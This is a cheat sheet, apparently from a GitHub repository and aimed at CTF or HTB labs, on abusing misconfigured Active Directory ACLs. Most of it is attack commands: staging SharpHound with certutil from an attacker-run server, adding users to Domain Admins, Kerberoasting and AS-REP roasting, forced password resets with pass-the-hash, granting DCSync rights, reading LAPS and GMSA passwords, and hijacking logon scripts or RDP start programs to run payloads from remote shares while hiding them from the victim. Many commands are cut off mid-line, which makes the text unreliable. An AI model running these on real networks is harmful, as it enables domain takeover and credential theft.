[!("ACL Abuse Diagram")
](https://github.com/rahulramesh96/Abusing-Active-Directory-ACLs-ACEs/blob/0b832b1fd12580f8edfa310d3068a229daaf8b4d/ACL%20Abuse%20Diagram)

List of Edges 	
1. AdminTo
2. MemberOf
3. HasSession
4. ForceChangePassword
5. AddMembers
6. AddSelf
7. CanRDP
8. CanPSRemote
9. ExecuteDCOM
10. SQLAdmin
11. AllowedToDelegate
12. DCSync
13. GetChanges/GetChangesAll
14. GenericAll
15. WriteDacl
16. GenericWrite
17. WriteOwner
18. WriteSPN
19. Owns
20. AddKeyCredentialLink
21. ReadLAPSPassword
22. ReadGMSAPassword
23. Contains
24. AllExtendedRights
25. GPLink
26. AllowedToAct
27. AddAllowedToAct
28. TrustedBy
29. SyncLAPSPassword
30. HasSIDHistory
31. WriteAccountRestrictions 		


# Check ACL for an User with ADACLScanner/Bloodhound

## Easy Commands to run first

1. Run Bloodhound from local machine (EASIEST)`bloodhound-python -v --zip -c All -u <username> -p <password> -d certified.htb -ns <dc-ip/system-ip>`

2. Or run (Not tested) - `ADACLScan.ps1 -Base “DC=contoso;DC=com” -Filter “(&(AdminCount=1))” -Scope subtree` in the target machine. 

## Only for Bloodhound-python/Bloodhound/SharpHound/

3. Upload SharpHound.exe to the target system and export the .json files to the local system.
   i. First Method - Using Evil-Winrm (Best bet)
     a. If you are using evil-winrm - Place the SharpHound.exe in the directory where you started evil-winrm. then `upload SharpHound.exe`
     b. From your Windows target machine - `SharpHound.exe --CollectionMethods All --ZipFileName output.zip`
     c. Or Run from Kali Linux - `SharpHound.exe --CollectionMethod All --LdapUsername <username> --LdapPassword <password> --ZipFileName output.zip`
   ii. Second Method
     a. Spin up a python web server. `python3 -m http.server <if any port>`.
     b. Download SharpHound from localhost - `certutil -f -split -urlcache http://<local-ip>:<port>/SharpHound.exe`
     c. Run this - `SharpHound.exe --CollectionMethods All --ZipFileName output.zip`
     d. Run an SMB Server and extract files. (Complicated)
    
4. Spin up the neo4j database. `sudo neo4j start`
5. Run `sudo bloodhound`.


## Misconfigured ACLs

32.1.GenericAll

    GenericAll on User : We can reset user’s password without knowing the current password
    GenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group :
        On Windows : net group “domain admins” hacker /add /domain
        On Linux:
            using the Samba software suite : net rpc group ADDMEM “GROUP NAME” UserToAdd -U ‘hacker%MyPassword123’ -W DOMAIN -I [DC IP]
            using bloodyAD: bloodyAD.py –host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd ‘GROUP NAME’
    GenericAll/GenericWrite : We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.

# Check for interesting permissions on accounts:

`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match “RDPUsers”`

# Check if current user has already an SPN setted:

`PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname`

# Force set the SPN on the account: Targeted Kerberoasting

`PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname=‘ops/whatev`

`PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname=`

# Grab the ticket

`PowerView2 > $User = Get-DomainUser username`

`PowerView2 > $User | Get-DomainSPNTicket | fl`

`PowerView2 > $User | Select serviceprincipalname`

# Remove the SPN

`PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname`

    GenericAll/GenericWrite : We can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back.
        On Windows:

# Modify the userAccountControl

`PowerView2 > Get-DomainUser username | ConvertFrom-UACValue`

`PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=41943`

# Grab the ticket

`PowerView2 > Get-DomainUser username | ConvertFrom-UACValue`

`ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username`

# Set back the userAccountControl

`PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=41943`

`PowerView2 > Get-DomainUser username | ConvertFrom-UACValue`

    On Linux:

# Modify the userAccountControl

`$ bloodyAD.py –host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUs`

# Grab the ticket

`$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | j`

# Set back the userAccountControl

`$ bloodyAD.py –host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] se`

32.2.GenericWrite

    Reset another user’s password
        On Windows:

#https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1

`$user = ‘DOMAIN\user1’;`

`$pass= ConvertTo-SecureString ‘user1pwd’ -AsPlainText -Force;`

`$creds = New-Object System.Management.Automation.PSCredential $user, $pass`

`$newpass = ConvertTo-SecureString ‘newsecretpass’ -AsPlainText -Force;`

`Set-DomainUserPassword -Identity ‘DOMAIN\user2’ -AccountPassword $newpass`

    On Linux:

# Using rpcclient from the Samba software suite

`rpcclient -U ‘attacker_user%my_password’ -W DOMAIN -c “setuserinfo2 target_us`

# Using bloodyAD with pass-the-hash

`bloodyAD.py –host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD`

    WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the

attacker to overwrite the logon script path of the delegate user, which means that the next

time, when the user delegate logs on, their system will execute our malicious script : SetADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue

“\\10.0.0.5\totallyLegitScript.ps1

GenericWrite and Remote Connection Manager

Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a

compromised RDSH, what can we actually do ? Well each user object in Active Directory

has a tab called ‘Environment’.

This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. – https://sensepost.com/blog/2020/ace-to-rce/

:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.

 

$UserObject = ([ADSI](“LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld”))

$UserObject.TerminalServicesInitialProgram = “\\1.2.3.4\share\file.exe“

$UserObject.TerminalServicesWorkDirectory = “C:\”

$UserObject.SetInfo()

NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.

32.3.WriteDACL

To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured :

 ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe – mimiKatzLocation .\mimikatz.exe -Username ‘user1’ -Domain ‘domain.local’ -Password ‘Welcome01!’

    WriteDACL on Domain:

        On Windows:

# Give DCSync right to the principal identity

Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString ‘user1pwd’ -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential(‘DOMAIN.LOCAL\us

Add-DomainObjectAcl -Credential $Cred -TargetIdentity ‘DC=domain,DC=local

    On Linux:

# Give DCSync right to the principal identity

bloodyAD.py –host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F38

# Remove right after DCSync

bloodyAD.py –host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F

    WriteDACL on Group

Add-DomainObjectAcl -TargetIdentity “INTERESTING_GROUP” -Rights WriteMembers -Pr

net group “INTERESTING_GROUP” User1 /add /domain

Or

bloodyAD.py –host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAl

# Remove right

bloodyAD.py –host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGeneri

32.4.WriteOwner

An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module)

Set-DomainObjectOwner -Identity ‘target_object’ -OwnerIdentity ‘controlled_princi

Or

bloodyAD.py –host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_u

This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.

32.5.ReadLAPSPassword

An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section

Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like ‘*’} -prop ‘ms-mcs-admp

Or for a given computer

bloodyAD.py -u john.doe -d bloody -p Password512 –host 192.168.10.2 getObjectAttr

32.6.ReadGMSAPassword

An attacker can read the GMSA password of the account this ACE applies to. This can be

achieved with the Active Directory and DSInternals PowerShell modules.

# Save the blob to a variable

$gmsa = Get-ADServiceAccount -Identity ‘SQL_HQ_Primary’ -Properties ‘msDS-ManagedPas

$mp = $gmsa.‘msDS-ManagedPassword’

# Decode the data structure using the DSInternals module

ConvertFrom-ADManagedPasswordBlob $mp

Or

python bloodyAD.py -u john.doe -d bloody -p Password512 –host 192.168.10.2 getOb

32.7.ForceChangePassword

An attacker can change the password of the user this ACE applies to:

    On Windows, this can be achieved with Set-DomainUserPassword (PowerView module):

$NewPassword = ConvertTo-SecureString ‘Password123!’ -AsPlainText -Force Set-DomainUserPassword -Identity ‘TargetUser’ -AccountPassword $NewPassword

    On Linux:

# Using rpcclient from the Samba software suite

rpcclient -U ‘attacker_user%my_password’ -W DOMAIN -c “setuserinfo2 target_user 23 t

# Using bloodyAD with pass-the-hash

bloodyAD.py –host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B
